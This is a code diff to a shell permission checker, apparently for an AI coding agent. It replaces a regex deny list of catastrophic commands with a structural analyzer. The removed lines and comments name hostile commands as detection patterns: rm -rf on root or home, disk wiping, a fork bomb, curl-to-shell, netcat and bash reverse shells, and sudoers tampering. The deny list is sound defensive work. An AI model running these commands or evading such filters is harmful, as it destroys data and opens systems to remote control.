@@ -9,66 +9,17 @@
 import { createRequire } from "node:module";
 import { createInterface } from "node:readline";
 import type { ShellScan } from "./shell-scanner.js";
+import { catastrophicReason, isCatastrophic } from "./catastrophic.js";
 
 // ---------------------------------------------------------------------------
-// Catastrophic command patterns — always denied, no exceptions
+// Catastrophic commands — always denied, no exceptions
+//
+// P0-3: detection moved to security/catastrophic.ts (structural argv
+// analysis: split into pipeline segments, tokenize, ask what the command
+// actually targets). The regex list that used to live here blocked
+// `rm -rf "node_modules"` / `rm -rf /tmp/build` while allowing
+// `rm -rf $HOME`, `curl https://x | zsh` and `find / -delete`.
 // ---------------------------------------------------------------------------
-
-const CATASTROPHIC_PATTERNS: RegExp[] = [
-  // rm -rf (original) — kept for backwards compatibility
-  /rm\s+-rf\s+[/~"]|(?:rm\s+-rf\s+\/\*)/i,
-  // rm with whitespace/flag variants: "rm  -rf /", "rm -fr /", "rm -r -f /",
-  // "rm --recursive --force /", "rm -rvf /" … i.e. any rm followed by one or
-  // more option flags and then a target at filesystem root or home.
-  // Does NOT match common safe commands: "rm -rf node_modules", "rm file.txt",
-  // "rm ./build" (target must START with / or ~).
-  /\brm\s+(?:-{1,2}[\w-]+\s+)+["']?[/~](?:\s|$|\/)/,
-  // rm with a single flag token containing both r/R and f (e.g. -fr, -Rf, -rvf)
-  // targeting / or ~ — covered above, but also catch "rm -fr --no-preserve-root".
-  /\brm\s+[^|;&>]*--no-preserve-root/i,
-  // base64/sh -c wrappers used to smuggle destructive commands past filters:
-  //   echo cm0gLXJmIC8= | base64 -d | sh
-  //   sh -c "rm -rf /"
-  /base64\s+(?:-d|-D|--decode)\b[^|;&]*\|\s*(?:ba|z|da)?sh\b/i,
-  /\b(?:ba|z|da)?sh\s+-c\s+["'][^"']*\brm\s+[^"']*\s-[a-zA-Z]*[rf]/i,
-  // Filesystem destruction
-  /\bmkfs(?:\.[a-z0-9]+)?\b/i,
-  /dd\s+.*of=\//i,
-  /chmod\s+-R\s+0[77][07][07]\s+[/~]/i,
-  // chmod -R 777 on / or ~ (any flag spelling: -R, -r, -Rf, --recursive)
-  /\bchmod\s+(?:-{1,2}[\w-]+\s+)+[0-7]{3,4}\s+["']?[/~](?:\s|$|\/)/,
-  /\bchmod\s+--recursive\s+[0-7]{3,4}\s+\/(?!home\/)[^\n]*/,
-  // Redirect raw writes to block devices: > /dev/sda, > /dev/nvme0n1, dd > disk...
-  />\s*\/dev\/(?:sd[a-z]+|hd[a-z]+|nvme\d+n\d+(?:p\d+)?|disk\d|rdisk\d)/i,
-  /:\s*\(\s*\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;/i,
-  // curl/wget pipe-to-shell: match any content between command and '| sh'/'| bash'
-  // Handles -qO-, -X POST, etc. flags; URL-like patterns must contain '/' or '.'
-  /curl\s+.*[/.].*\s*\|\s*sh\b/i,
-  /curl\s+.*[/.].*\s*\|\s*bash\b/i,
-  /wget\s+.*[/.].*\s*\|\s*sh\b/i,
-  /wget\s+.*[/.].*\s*\|\s*bash\b/i,
-  // sudo rm with any recursive/force flag combo: "sudo rm -rf x", "sudo rm -fr /usr"
-  /sudo\s+rm\s+[^|;&]*-\w*[rR]/i,
-  /\bshutdown\b|\breboot\b|\binit\s+[06]\b/i,
-  />\s*\/dev\/sda/i,
-  /\|\s*nc\s+-e\s+/i,
-  /\|\s*bash\s+-i/i,
-  /sysctl\s+-w\s+kernel\.panic=/i,
-  /echo\s+[^|]*>\s*\/etc\/sudoers/i,
-  // H-13 additions: remote-code-exec variants + macOS host tampering
-  /curl\s+.*[/.].*\s*\|\s*python(?:\d)?\b/i,
-  /wget\s+.*[/.].*\s*\|\s*python(?:\d)?\b/i,
-  /\bpowershell(?:\.exe)?\s+(-enc|-e\b|-encodedcommand\b)/i,
-  /\bdscl\s+\.\s+-create\s+\/Users\//i,
-  /\bdefaults\s+write\s+com\.apple/i,
-  /\bmv\s+(-\w+\s+)*["']?~(?:\s|$|\/(?!Projects|work))/,
-  /\bcurl\s+.*[/.].*\s*\|\s*python3?\s+-c\b/i,
-  /\bperl\s+-e\b.*\bsystem\s*\(/i,
-];
-
-function isCatastrophic(command: string): boolean {
-  return CATASTROPHIC_PATTERNS.some((p) => p.test(command));
-}
 
 // ---------------------------------------------------------------------------
 // Shell scanner access — module-level memo (P-perf)
@@ -575,7 +526,7 @@ export class PermissionChecker {
   classify(command: string): PermissionResult {
     // Catastrophic deny is the absolute floor.
     if (isCatastrophic(command)) {
-      return { decision: "deny", reason: "matches catastrophic command pattern" };
+      return { decision: "deny", reason: `blocked by the catastrophic floor: ${catastrophicReason(command) ?? "matches a catastrophic command pattern"}` };
     }
     // Policy deny wins over everything (enterprise hard floor).
     const policy = this.policyEffect("shell", command);
@@ -636,7 +587,7 @@ export class PermissionChecker {
   private classifyShellCore(command: string): PermissionResult {
     // Catastrophic deny is the absolute floor — before scanner/splitting.
     if (isCatastrophic(command)) {
-      return { decision: "deny", reason: "matches catastrophic command pattern" };
+      return { decision: "deny", reason: `blocked by the catastrophic floor: ${catastrophicReason(command) ?? "matches a catastrophic command pattern"}` };
     }
     let scan: import("./shell-scanner.js").ShellScan | null;
     try {
